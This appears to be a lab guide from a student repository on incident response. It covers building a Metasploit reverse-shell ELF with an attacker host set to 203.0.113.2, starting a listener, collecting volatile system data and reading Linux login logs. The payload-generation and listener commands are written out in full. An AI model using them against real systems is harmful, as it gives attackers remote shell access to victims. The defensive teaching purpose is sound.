# Incident Response Procedures: A Hands-On Learning Guide

This guide is designed to teach and guide you through critical steps in incident response, including crafting and deploying malicious executables for testing, collecting volatile data, and analyzing system logs. Each step not only shows *how* to perform tasks but also explains *why* they are essential in an incident response context.

---

## Project Link

[Incident Response Procedures](https://github.com/StephVergil/-Incident-Reponse-Procedures/blob/main/%20Incident%20Reponse%20Procedures.docx)

---

## Overview

### What is Incident Response?

Incident response is the systematic approach organizations take to identify, mitigate, and recover from security incidents. Key stages include:
1. **Preparation**: Setting up tools, processes, and training.
2. **Identification**: Detecting incidents and understanding their scope.
3. **Containment and Mitigation**: Limiting the impact and neutralizing threats.
4. **Recovery**: Restoring systems to operational states.
5. **Lessons Learned**: Reviewing and improving defenses.

### What Will You Learn?

This lab focuses on:
1. **Malicious Executable Creation**: Understanding how attackers create tools to compromise systems.
2. **Volatile Data Collection**: Learning to capture ephemeral data for forensic analysis.
3. **Log Analysis**: Exploring system logs to detect suspicious activity and understand incidents.

---

## Key Concepts and Tools

### **1. Malicious Executables**
These are programs designed to perform unauthorized actions on a system, such as establishing reverse shells. In a controlled environment, they are used to test and evaluate system defenses.

### **2. Volatile Data**
Volatile data resides in memory and is lost when a system shuts down. Examples include running processes, open network connections, and active routing tables. Collecting this data is vital during an investigation.

### **3. System Logs**
Logs are files that record events and actions within a system. Common logs include:
- **auth.log**: Tracks authentication attempts.
- **wtmp**: Records successful logins.
- **btmp**: Logs failed login attempts.

---

## Step-by-Step Guide with Explanations

### 1. Building a Malicious Executable

#### **What Are We Doing?**
We will create a malicious executable that, when run on a target system, establishes a reverse shell to a remote attacker-controlled machine.

#### **Steps**:
1. **Set Up the Environment**:
   - Open the terminal in **Kali VM**.
   - Create a directory for the malicious file:
     ```bash
     mkdir malicious
     cd malicious
     ```
   - **Why?** Organizing files ensures a clean working environment.

2. **Start Metasploit**:
   - Run Metasploit:
     ```bash
     msfconsole
     ```
   - Search for a reverse shell payload:
     ```bash
     search linux/x64/shell_reverse_tcp
     ```
   - Use the payload:
     ```bash
     use 0
     ```

   - **Why?** A reverse shell payload allows remote access to the target system when executed.

3. **Configure the Payload**:
   - Set the local host (attacker's IP):
     ```bash
     set LHOST 203.0.113.2
     ```
   - Generate the malicious executable:
     ```bash
     generate -f elf -o linux
     ```

   - **Why?** This creates the executable file `linux`, which can be used to establish a reverse shell connection.

4. **Set Up a Listener**:
   - Configure Metasploit to listen for incoming connections:
     ```bash
     use exploit/multi/handler
     set payload linux/x64/shell_reverse_tcp
     exploit
     ```

   - **Why?** The listener waits for the reverse shell connection initiated by the victim's system.

---

### 2. Collecting Volatile Data

#### **What Are We Doing?**
Once a system is compromised, we collect volatile data (data in memory or temporary storage) before the system is rebooted or shut down.

#### **Steps**:
1. **Create a Report File**:
   - Gain root access:
     ```bash
     sudo su
     ```
   - Create a file to document findings:
     ```bash
     echo "sysadmin investigator" > report.txt
     ```
   - **Why?** The `report.txt` file stores all collected volatile data for later analysis.

2. **Capture Volatile Data**:
   - Append important system details to the file:
     - **Date and Time**:
       ```bash
       date >> report.txt
       ```
     - **System Information**:
       ```bash
       uname -a >> report.txt
       ```
     - **Hostname**:
       ```bash
       hostname >> report.txt
       ```
     - **Network Interfaces**:
       ```bash
       ifconfig -a >> report.txt
       ```
     - **Running Processes**:
       ```bash
       ps -aux >> report.txt
       ```
     - **Routing Table**:
       ```bash
       route -n >> report.txt
       ```

   - **Why?** Each command gathers critical information for forensic analysis. For example, `netstat -ano` shows network connections, and `ps -aux` lists running processes.

3. **Review Collected Data**:
   - Display the contents of the report:
     ```bash
     cat report.txt | less
     ```

   - **Why?** Reviewing the file ensures all necessary data is captured before proceeding.

---

### 3. Viewing and Analyzing Logs

#### **What Are We Doing?**
Logs provide a detailed record of system events, such as login attempts and user activity. Reviewing logs helps identify unauthorized access or suspicious behavior.

#### **Steps**:
1. **Authentication Logs**:
   - View `auth.log`:
     ```bash
     cat /var/log/auth.log | less
     ```
   - **Why?** This log tracks authentication attempts, helping identify unauthorized access.

2. **Failed Login Attempts**:
   - View `btmp`:
     ```bash
     last -f /var/log/btmp | more
     ```
   - **Why?** This file logs failed login attempts, indicating possible brute-force attacks.

3. **Successful Logins**:
   - View `wtmp`:
     ```bash
     last -f /var/log/wtmp | more
     ```
   - **Why?** This file tracks successful logins and can identify suspicious user activity.

---

## Resources

- **Metasploit Framework**: [Official Documentation](https://www.metasploit.com/)
- **Linux Command Guide**: [Linux Commands](https://linux.die.net/man/)
- **Python HTTP Server**: [Python HTTP Docs](https://docs.python.org/3/library/http.server.html)
- **Log Analysis Tools**: [Log Management](https://www.loggly.com/)

---

## Key Takeaways

1. **Building Malicious Tools**:
   - Understand how attackers craft and deploy malicious files to compromise systems.
2. **Volatile Data Collection**:
   - Learn to gather ephemeral data critical for forensic investigations.
3. **Log Analysis**:
   - Use system logs to identify unauthorized access and unusual activity.

### Disclaimer
This project was conducted in a controlled environment. Unauthorized use of these techniques or tools outside such an environment may violate ethical guidelines and legal regulations.

---

> **Author**: Stephanie Vergil
